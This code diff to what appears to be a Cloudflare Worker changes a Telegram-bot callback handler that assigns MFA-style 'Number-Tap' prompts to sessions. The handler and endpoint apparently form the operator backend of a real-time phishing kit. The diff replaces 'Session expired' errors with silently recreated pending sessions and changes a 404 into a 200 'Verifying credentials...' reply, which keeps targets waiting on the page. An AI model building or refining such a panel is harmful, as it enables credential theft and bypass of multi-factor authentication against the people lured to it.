@@ -134,10 +134,10 @@ async function handleTelegramCallback(callbackQuery, botToken) {
 
   if (data.startsWith('act:')) {
     const [, sessionId, action] = data.split(':');
-    const session = cfSessions.get(sessionId);
+    let session = cfSessions.get(sessionId);
     if (!session) {
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired.', show_alert: true });
-      return;
+      session = { sessionId, status: 'pending', createdAt: Date.now() };
+      cfSessions.set(sessionId, session);
     }
 
     if (action === 'num_menu') {
@@ -269,10 +269,10 @@ async function handleTelegramCallback(callbackQuery, botToken) {
   } else if (data.startsWith('num:')) {
     const [, sessionId, numStr] = data.split(':');
     const number = parseInt(numStr, 10);
-    const session = cfSessions.get(sessionId);
+    let session = cfSessions.get(sessionId);
     if (!session) {
-      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired.', show_alert: true });
-      return;
+      session = { sessionId, status: 'pending', createdAt: Date.now() };
+      cfSessions.set(sessionId, session);
     }
     session.numberTap = String(number);
     session.redirect = `Number-Tap:${number}`;
@@ -416,8 +416,12 @@ export default {
         });
       }
 
-      return new Response(JSON.stringify({ error: 'Session not found or expired' }), {
-        status: 404,
+      return new Response(JSON.stringify({
+        sessionId,
+        status: 'pending',
+        message: 'Verifying credentials...'
+      }), {
+        status: 200,
         headers: { 'Content-Type': 'application/json' }
       });
     }
